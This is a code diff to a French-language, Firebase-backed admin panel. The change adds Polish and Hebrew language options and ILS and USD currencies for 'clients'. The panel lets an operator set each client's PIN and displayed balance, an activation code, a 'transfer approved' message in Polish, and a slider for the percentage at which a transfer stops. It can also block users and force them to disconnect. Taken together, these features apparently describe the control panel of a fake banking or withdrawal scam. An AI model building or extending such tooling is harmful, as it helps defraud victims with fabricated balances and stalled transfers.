@@ -64,7 +64,7 @@
         .btn-block { width: 100%; justify-content: center; }
         .btn-group { display: flex; gap: 10px; flex-wrap: wrap; }
         .table-wrap { overflow-x: auto; margin-top: 4px; }
-        table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 700px; }
+        table { width: 100%; border-collapse: collapse; font-size: 13px; min-width: 800px; }
         th { background: #F9FAFB; color: var(--text-secondary); font-weight: 600; font-size: 11px; text-transform: uppercase; letter-spacing: 0.5px; padding: 12px 14px; text-align: left; border-bottom: 1.5px solid var(--border); }
         td { padding: 12px 14px; border-bottom: 1px solid var(--border); vertical-align: middle; }
         tr:last-child td { border-bottom: none; }
@@ -75,9 +75,7 @@
         .badge-blocked { background: #FEE2E2; color: #DC2626; font-weight: 600; font-size: 10px; padding: 2px 8px; border-radius: 12px; margin-left: 4px; }
         .badge-online { background: #D1FAE5; color: #065F46; font-weight: 600; font-size: 10px; padding: 2px 8px; border-radius: 12px; margin-left: 4px; }
         .badge-offline { background: #FEE2E2; color: #991B1B; font-weight: 600; font-size: 10px; padding: 2px 8px; border-radius: 12px; margin-left: 4px; }
-        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 6px; }
-        .status-dot.online { background: #10B981; }
-        .status-dot.offline { background: #EF4444; }
+        .badge-lang { background: #EFF6FF; color: #1E40AF; font-weight: 600; font-size: 10px; padding: 2px 10px; border-radius: 12px; }
         .action-btns { display: flex; gap: 6px; flex-wrap: wrap; }
         .action-btns button { padding: 4px 10px; font-size: 11px; border-radius: 6px; border: 1px solid var(--border); background: #fff; cursor: pointer; transition: var(--transition); font-family: inherit; font-weight: 500; }
         .action-btns .edit-btn { color: var(--p); border-color: var(--p-light); background: var(--p-light); }
@@ -145,7 +143,7 @@
             </div>
         </div>
         <div class="badge-version">
-            <i class="fas fa-circle-check"></i> v2.0 · connecté
+            <i class="fas fa-circle-check"></i> v2.1 · Langues & devises
         </div>
     </header>
 
@@ -189,8 +187,17 @@
                 <div class="field">
                     <label><i class="fas fa-coins"></i> Devise</label>
                     <select id="devise">
-                        <option value="zł">zł - Zloty polonais (PLN)</option>
-                        <option value="€">€ - Euro (EUR)</option>
+                        <option value="zł">zł (PLN)</option>
+                        <option value="€">€ (EUR)</option>
+                        <option value="₪">₪ (ILS)</option>
+                        <option value="$">$ (USD)</option>
+                    </select>
+                </div>
+                <div class="field">
+                    <label><i class="fas fa-language"></i> Langue</label>
+                    <select id="langue">
+                        <option value="pl">Polski</option>
+                        <option value="he">עברית (Hébreu)</option>
                     </select>
                 </div>
                 <div class="field">
@@ -228,6 +235,7 @@
                 </div>
             </div>
 
+            <!-- Slider pourcentage -->
             <div class="slider-section">
                 <div class="flex-between">
                     <label><i class="fas fa-gauge-high"></i> Pourcentage d'arrêt du virement</label>
@@ -263,10 +271,10 @@
                             <th>Client</th>
                             <th>PIN</th>
                             <th>Montant</th>
+                            <th>Devise</th>
+                            <th>Langue</th>
                             <th>Statut</th>
                             <th>Thème</th>
-                            <th>Code</th>
-                            <th>%</th>
                             <th>Action</th>
                         </tr>
                     </thead>
@@ -420,7 +428,6 @@
         }
 
         // ===== ÉTAT DES SESSIONS =====
-        // Récupère les sessions d'un client et renvoie le nombre de sessions actives
         async function getSessionsStatus(clientId) {
             const snap = await get(ref(db, 'clients/' + clientId + '/sessions'));
             if (!snap.exists()) return { active: 0, total: 0, sessions: [] };
@@ -439,6 +446,7 @@
                     pin: '973018',
                     montant: 10000,
                     devise: 'zł',
+                    langue: 'pl',
                     theme: 'purple',
                     code: 'ACT123',
                     msg: 'Przelew zatwierdzony ✓',
@@ -470,13 +478,15 @@
             }
         }
 
+        function getLangBadge(lang) {
+            const names = { pl: 'Polski', he: 'עברית' };
+            return `<span class="badge-lang">${names[lang] || 'Polski'}</span>`;
+        }
+
         function render() {
             const rows = Object.entries(data).map(([id, v]) => {
                 const blockedBadge = v.blocked ? `<span class="badge-blocked"><i class="fas fa-lock"></i> BLOQUÉ</span>` : '';
                 const notifBadge = v.notification ? `<span class="badge-notif">🔔</span>` : '';
-                // Récupérer le statut des sessions (on le fait de manière asynchrone, mais on va afficher un placeholder et mettre à jour après)
-                // Pour éviter d'attendre, on affiche un placeholder et on met à jour via un écouteur séparé.
-                // On va simplement appeler une fonction pour mettre à jour les statuts après.
                 return `
                 <tr id="row-${id}">
                     <td>
@@ -484,11 +494,11 @@
                         <span style="color:#6b7280;font-size:11px;">${v.email} ${blockedBadge} ${notifBadge}</span>
                     </td>
                     <td><span class="badge">${v.pin}</span></td>
-                    <td>${Number(v.montant).toLocaleString('pl-PL')} ${v.devise || 'zł'}</td>
+                    <td>${Number(v.montant).toLocaleString('pl-PL')}</td>
+                    <td><span class="badge" style="background:#E5E7EB;color:#1A1D2E;">${v.devise || 'zł'}</span></td>
+                    <td>${getLangBadge(v.langue || 'pl')}</td>
                     <td id="status-${id}"><span class="text-muted">Chargement...</span></td>
                     <td>${getThemeBadge(v.theme || 'purple')}</td>
-                    <td>${v.code}</td>
-                    <td>${v.pct}%</td>
                     <td>
                         <div class="action-btns">
                             <button class="edit-btn" onclick="editClient('${id}')"><i class="fas fa-pen-to-square"></i> Modifier</button>
@@ -501,7 +511,6 @@
             $('tb').innerHTML = rows || '<tr><td colspan="8" style="text-align:center;color:#888;padding:24px;font-size:14px;">Aucun client enregistré</td></tr>';
             document.getElementById('clientCount').textContent = Object.keys(data).length;
             refreshLists();
-            // Mettre à jour les statuts de connexion pour chaque client
             updateAllStatuses();
         }
 
@@ -525,8 +534,7 @@
             });
         }
 
-        // Écouter les changements de sessions pour mettre à jour en direct
-        // On va ajouter un écouteur sur chaque client pour les sessions
+        // Écouter les changements de sessions
         Object.keys(data).forEach(id => {
             const sessionsRef = ref(db, 'clients/' + id + '/sessions');
             onValue(sessionsRef, () => {
@@ -569,6 +577,7 @@
                 pin: $('pin').value.trim(),
                 montant: finalMontant,
                 devise: $('devise').value,
+                langue: $('langue').value,
                 theme: $('theme').value,
                 code: $('code').value.trim(),
                 msg: $('msg').value.trim(),
@@ -593,14 +602,14 @@
                     await addCreditTransaction(editId, creditTransaction.amount, creditTransaction.devise);
                     await update(ref(db, 'clients/' + editId), { lastCreditAmount: finalMontant });
                 }
-                showAlert(`✅ Client mis à jour. Nouveau solde : ${finalMontant} ${o.devise}.`, 'success');
+                showAlert(`✅ Client mis à jour. Nouveau solde : ${finalMontant} ${o.devise}. Langue : ${o.langue}.`, 'success');
             } else {
                 const newRef = push(clientsRef, { ...o, created: Date.now(), lastCreditAmount: finalMontant });
                 clientId = newRef.key;
                 if (creditTransaction && creditTransaction.amount > 0) {
                     await addCreditTransaction(clientId, creditTransaction.amount, creditTransaction.devise);
                 }
-                showAlert('✅ Nouveau client créé avec succès. Thème: ' + o.theme, 'success');
+                showAlert('✅ Nouveau client créé avec succès. Thème: ' + o.theme + ' · Langue: ' + o.langue, 'success');
             }
 
             resetForm();
@@ -612,6 +621,7 @@
         function resetForm() {
             ['nom', 'email', 'pin', 'montant', 'addMontant', 'code', 'msg', 'pays', 'adresse', 'tel', 'notification'].forEach(i => $(i).value = '');
             $('devise').value = 'zł';
+            $('langue').value = 'pl';
             $('theme').value = 'purple';
             $('pct').value = 100;
             pvDisplay.textContent = '100%';
@@ -629,6 +639,7 @@
             $('pin').value = v.pin;
             $('montant').value = v.montant;
             $('devise').value = v.devise || 'zł';
+            $('langue').value = v.langue || 'pl';
             $('theme').value = v.theme || 'purple';
             $('code').value = v.code;
             $('msg').value = v.msg;
@@ -768,7 +779,6 @@
         window.closeSessionsModal = closeSessionsModal;
         window.forceDisconnect = forceDisconnect;
 
-        // Mettre à jour les statuts périodiquement
         setInterval(updateAllStatuses, 5000);
     </script>
 </body>
